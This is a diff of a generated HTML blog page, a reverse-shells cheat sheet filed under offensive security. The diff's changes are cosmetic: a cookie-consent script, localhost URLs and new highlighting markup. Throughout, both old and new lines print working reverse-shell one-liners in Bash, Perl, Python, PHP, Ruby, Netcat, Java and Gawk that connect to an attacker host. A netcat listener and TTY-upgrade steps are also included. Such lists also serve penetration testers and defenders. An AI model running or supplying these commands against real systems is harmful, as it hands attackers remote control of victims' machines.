@@ -5,7 +5,24 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-
+  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
+<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
+<script>
+window.addEventListener("load", function(){
+window.cookieconsent.initialise({
+  "palette": {
+    "popup": {
+      "background": "#424242"
+    },
+    "button": {
+      "background": "#2a7ae2"
+    }
+  },
+  "content": {
+    "href": "/privacy-policy"
+  }
+})});
+</script>
   
   
   
@@ -14,10 +31,10 @@
   
 
   <link rel="stylesheet" href="/assets/main.css">
-  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/">
+  <link rel="canonical" href="http://localhost:4000/2018/07/15/reverse-shells-cheat-sheet/">
   
   
-  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
+  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="http://localhost:4000/feed.xml">
 
   
 
@@ -103,6 +120,8 @@
     
       
     
+      
+    
   
     
     
@@ -114,6 +133,8 @@
     
       
         <a href="/categories/offensive-security/">offensive_security</a>
+      
+    
       
     
       
@@ -135,8 +156,8 @@
 <h2 id="listening">Listening</h2>
 <p>To setup a listening netcat instance, enter the following:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nvlp 80
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">sudo nc -nvlp 80
+</span></code></pre></div></div>
 
 <h2 id="reverse-shells">Reverse Shells</h2>
 
@@ -144,85 +165,85 @@
 
 <h4 id="bash">Bash</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash -i &gt;</span>&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
 </code></pre></div></div>
 
 <h4 id="perl">PERL</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">perl -e 'use Socket;</span><span class="nv">$i</span><span class="o">=</span><span class="s2">"10.0.0.1"</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span>1234<span class="p">;</span>socket<span class="o">(</span>S,PF_INET,SOCK_STREAM,getprotobyname<span class="o">(</span><span class="s2">"tcp"</span><span class="o">))</span><span class="p">;</span><span class="k">if</span><span class="o">(</span>connect<span class="o">(</span>S,sockaddr_in<span class="o">(</span><span class="nv">$p</span>,inet_aton<span class="o">(</span><span class="nv">$i</span><span class="o">)))){</span>open<span class="o">(</span>STDIN,<span class="s2">"&gt;&amp;S"</span><span class="o">)</span><span class="p">;</span>open<span class="o">(</span>STDOUT,<span class="s2">"&gt;&amp;S"</span><span class="o">)</span><span class="p">;</span>open<span class="o">(</span>STDERR,<span class="s2">"&gt;&amp;S"</span><span class="o">)</span><span class="p">;</span><span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/sh -i"</span><span class="o">)</span><span class="p">;</span><span class="o">}</span><span class="p">;</span><span class="s1">'
+</span></code></pre></div></div>
 
 <h4 id="perl-windows-1">PERL Windows 1</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">perl -MIO -e '$</span><span class="nv">c</span><span class="o">=</span>new IO::Socket::INET<span class="o">(</span>PeerAddr,<span class="s2">"ATTACKING-IP:80"</span><span class="o">)</span><span class="p">;</span>STDIN-&gt;fdopen<span class="o">(</span><span class="nv">$c</span>,r<span class="o">)</span><span class="p">;</span><span class="nv">$~</span>-&gt;fdopen<span class="o">(</span><span class="nv">$c</span>,w<span class="o">)</span><span class="p">;</span>system<span class="nv">$_</span> <span class="k">while</span>&lt;<span class="o">&gt;</span><span class="p">;</span><span class="s1">'
+</span></code></pre></div></div>
 
 <h4 id="python">Python</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">python -c 'import socket,subprocess,os;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.0.0.1"</span>,1234<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span> os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span><span class="s1">'
+</span></code></pre></div></div>
 
 <h4 id="php">PHP</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">php -r '$</span><span class="nv">sock</span><span class="o">=</span>fsockopen<span class="o">(</span><span class="s2">"10.0.0.1"</span>,1234<span class="o">)</span><span class="p">;</span><span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span><span class="o">)</span><span class="p">;</span><span class="s1">'
+</span></code></pre></div></div>
 
 <h4 id="ruby">Ruby</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;</span><span class="nb">exec </span>sprintf<span class="o">(</span><span class="s2">"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"</span>,f,f,f<span class="o">)</span><span class="s1">'
+</span></code></pre></div></div>
 
 <h4 id="netcat">Netcat</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -e /bin/sh 10.0.0.1 1234
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nc -e /bin/sh 10.0.0.1 1234
+</span></code></pre></div></div>
 
 <h4 id="java">Java</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
-p.waitFor()
-</code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">r = Runtime.getRuntime()
+</span><span class="gp">p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;</span>/dev/tcp/10.0.0.1/2002<span class="p">;</span><span class="nb">cat</span> &lt;&amp;5 | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do</span> <span class="se">\$</span>line 2&gt;&amp;5 <span class="o">&gt;</span>&amp;5<span class="p">;</span> <span class="k">done</span><span class="s2">"] as String[])
+</span><span class="go">p.waitFor()
+</span></code></pre></div></div>
 
 <h4 id="gawk-reverse-shell">Gawk Reverse Shell</h4>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/gawk -f
-
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="o">!</span>/usr/bin/gawk <span class="nt">-f</span>
+<span class="go">
 BEGIN {
         Port    =       8080
-        Prompt  =       "bkd&gt; "
-
+</span><span class="gp">        Prompt  =       "bkd&gt;</span> <span class="s2">"
+</span><span class="go">
         Service = "/inet/tcp/" Port "/0/0"
         while (1) {
                 do {
                         printf Prompt |&amp; Service
                         Service |&amp; getline cmd
                         if (cmd) {
-                                while ((cmd |&amp; getline) &gt; 0)
-                                        print $0 |&amp; Service
-                                close(cmd)
+</span><span class="gp">                                while ((cmd |&amp; getline) &gt;</span> 0<span class="o">)</span>
+<span class="gp">                                        print $</span>0 |&amp; Service
+<span class="go">                                close(cmd)
                         }
                 } while (cmd != "exit")
                 close(Service)
         }
 }
-</code></pre></div></div>
+</span></code></pre></div></div>
 
 <h2 id="spawning-interactive-reverse-shells-with-tty">Spawning interactive reverse shells with TTY</h2>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># In reverse shell 
-$ python -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span> In reverse shell 
+<span class="gp">$</span> python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="go">Ctrl-Z
 
-# In Attacker console
-$ stty raw -echo
-$ fg
-
-# In reverse shell
-$ reset
-$ export SHELL=bash
-$ export TERM=xterm-256color
-$ stty rows &lt;num&gt; columns &lt;cols&gt;
+</span><span class="gp">#</span> In Attacker console
+<span class="gp">$</span> <span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="gp">$</span> <span class="nb">fg</span>
+<span class="go">
+</span><span class="gp">#</span> In reverse shell
+<span class="gp">$</span> reset
+<span class="gp">$</span> <span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="gp">$</span> <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+<span class="gp">$</span> <span class="nb">stty </span>rows &lt;num&gt; columns &lt;cols&gt;
 </code></pre></div></div>
 
 <h2 id="sources">Sources</h2>
@@ -275,8 +296,9 @@ s.setAttribute('data-timestamp', +new Date());
     <p>
       
 
-&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>
+&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="http://localhost:4000/feed.xml">RSS</a>
 
+      | <a href="/privacy-policy" >Privacy Policy</a>
     </p>
 
   </div>
